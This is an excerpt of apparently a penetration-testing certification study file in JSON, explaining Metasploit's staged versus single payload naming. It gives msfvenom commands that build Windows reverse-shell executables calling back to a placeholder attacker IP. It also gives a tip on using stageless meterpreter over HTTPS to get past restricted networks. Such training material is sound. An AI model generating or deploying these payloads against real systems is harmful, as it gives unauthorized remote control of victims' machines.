      "primary_cert": "CPTS",
      "source": "CPTS Module 09: Metasploit",
      "examples": [
        {
          "label": "Single (no stage) - underscore chain",
          "command": "windows/shell_bind_tcp"
        },
        {
          "label": "Staged - stager/stage split by a slash",
          "command": "windows/shell/bind_tcp"
        },
        {
          "label": "OSCP Ch20 — list all Windows x64 payloads via msfvenom",
          "command": "msfvenom -l payloads --platform windows --arch x64"
        },
        {
          "label": "OSCP Ch20 — non-staged EXE (shell_reverse_tcp — underscore = single payload)",
          "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o nonstaged.exe"
        },
        {
          "label": "OSCP Ch20 — staged EXE (shell/reverse_tcp — slash = stager+stage, needs multi/handler)",
          "command": "msfvenom -p windows/x64/shell/reverse_tcp LHOST=<kali_ip> LPORT=443 -f exe -o staged.exe"
        }
      ],
      "notes": "The slash vs underscore is the tell: windows/shell/bind_tcp is staged, windows/shell_bind_tcp is single. The handler payload must match the generated payload exactly. Also covered in: OSCP PEN-200 Chapter 20 (The Metasploit Framework). OSCP Ch20: Non-staged (underscore, e.g. shell_reverse_tcp) — the full payload is delivered at once; catches with plain nc. Staged (slash, e.g. shell/reverse_tcp) — a tiny stager connects back first, then downloads the stage; requires multi/handler (nc cannot receive the stage). Use meterpreter_reverse_https (stageless meterpreter) on restricted networks where staged connections may be blocked.",
